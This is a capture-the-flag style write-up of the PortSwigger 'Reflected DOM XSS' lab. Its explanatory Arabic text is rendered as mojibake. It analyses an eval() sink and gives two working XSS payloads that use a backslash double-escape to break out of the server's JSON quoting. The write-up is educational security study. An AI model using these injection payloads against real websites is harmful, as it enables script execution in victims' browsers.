# ๐ก๏ธ [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

## ๐ Lab Information
* **Lab Name:** Reflected DOM XSS
* **Difficulty:** Practitioner
* **Vulnerability Type:** Reflected DOM-based XSS
* **Sink:** `eval()` function

---

## ๐ 1. Code Analysis 

### Vulnerable Code Snippet:
```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            // ุงููุตูุจุฉ ููุง: ุงุณุชุฎุฏุงู eval ููุนุงูุฌุฉ ุงููุต ุงูุฑุงุฌุน ูู ุงูุณูุฑูุฑ
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
}
````

### Server Response Format:

ุนูุฏ ุงูุจุญุซุ ุงูุณูุฑูุฑ ูุฑุฏ ุจู JSON ูุญุชูู ุนูู ูุง ุจุญุซุช ุนูู:

JSON

```
{"results":[],"searchTerm":"test"}
```

### ุงูุนูุจุฉ (The Constraint):

ุนูุฏ ูุญุงููุฉ ูุณุฑ ุงูู JSON ุจุงุณุชุฎุฏุงู `"` ููุทุ ุงูุณูุฑูุฑ ูููู ุจุญูุงูุชูุง ุจูุถุน `\` ูุจููุง (Escaping).

- **Input:** `"`
    
- **Response:** `{"searchTerm":"\""}`
    
- **Result:** ุงูู `eval` ุชุนุชุจุฑูุง ุฌุฒุก ูู ุงููุต ููุง ูุชู ูุณุฑ ุงูููุฏ.
    

---

## ๐ฅ 2. The Exploit 

ูุญู ูุฐู ุงููุดููุฉุ ูุฌุจ ุฎุฏุงุน ุงูุณูุฑูุฑ ููุนุชูุฏ ุฃูู ูุงู ุจุญูุงูุฉ ุงูููุฏุ ุจูููุง ูุญู ูููู ุจู "ุฅูุบุงุก ุงูุญูุงูุฉ" ุจุงุณุชุฎุฏุงู Backslash ุฅุถุงูู.

### ููุฑุฉ ุงูุญู (The Double Escape Trick):

ุจูุง ุฃู ุงูุณูุฑูุฑ ูุถูู `\` ูุจู ุงูู `"`ุ ุณูููู ูุญู ุจุฅุฑุณุงู `\` ุฎุงุตุฉ ุจูุง ูุจู ุงูู `"` ุฃูุถูุง.

- **Input:** `\"`
    
- **Server Processing:** ุงูุณูุฑูุฑ ูุฑู `"` ููุถุน ูุจููุง `\`ุ ูููู ูุชุฑู ุงูู `\` ุงูุฎุงุตุฉ ุจูุง ููุง ูู.
    
- **Result in JSON:** `{"searchTerm":"\\""}`
    

### ูุงุฐุง ูุฑู ุงูู `eval`ุ

ุนูุฏูุง ููุฑุฃ `eval` ุงููุต `\\"`:

1. ุงูู `\\` ุงูุฃููู ุชุชุญูู ูู **Backslash ุญุฑูู** (Literal Backslash).
    
2. ุงูู `"` ุงูุซุงููุฉ ุชุตุจุญ **ุบูุฑ ูุญููุฉ** (Unescaped Quote)ุ ูุจุงูุชุงูู ุชุบูู ุงูู String ูุชุณูุญ ููุง ุจูุชุงุจุฉ ููุฏ ุฌุฏูุฏ.
    

### Payloads:

#### Option 1 (Arithmetic Context ):

JavaScript

```
\"-alert(1)}//
```

- ุชูุณูุฑ ุงูุชูููุฐ:
    
    ุงูููุฏ ุฏุงุฎู eval ูุตุจุญ:
    
    JavaScript
    
    ```
    var searchResultsObj = {"searchTerm":"\\"-alert(1)}//"};
    ```
    
    ููุง ูููุง ุจุทุฑุญ `alert(1)` ูู ุงูู String (ุนูููุฉ ุญุณุงุจูุฉ ุชุฌุจุฑ ุงููุชุตูุญ ุนูู ุชูููุฐ ุงูู alert)ุ ุซู ุฃุบูููุง ุงูู Object ุจู `}` ูุนูููุง Comment ููุจุงูู.
    

#### Option 2 (Breaking the Statement):

JavaScript

```
\"}; alert(1);//
```

- ุชูุณูุฑ ุงูุชูููุฐ:
    
    ูููู ุจุฅุบูุงู ุงูู Object ูุงูู Statement ุจุงููุงููุ ุซู ูุจุฏุฃ ุฃูุฑ ุฌุฏูุฏ.
    

---

## ๐ 3. Takeaways (ุงูุฎูุงุตุฉ)

1. **Dangerous Sinks:** ุฏุงูุฉ `eval()` ูู ุฃุฎุทุฑ Sink ูู ุงูุฌุงูุงุณูุฑูุจุช ูุฃููุง ุชููุฐ ุงููุตูุต ูุฃููุฏ.
    
2. **JSON Injection:** ุนูุฏ ุงูุญูู ุฏุงุฎู JSON Stringุ ุงูุณูุฑูุฑ ุบุงูุจุงู ุณูุณุชุฎุฏู ุงูู Escaping `\"`. ุงูุญู ุฏุงุฆูุงู ูููู ุจุญูู `\` ุฎุงุตุฉ ุจูุง ูููุฑูุจ ูู ุงูู Escape.
---
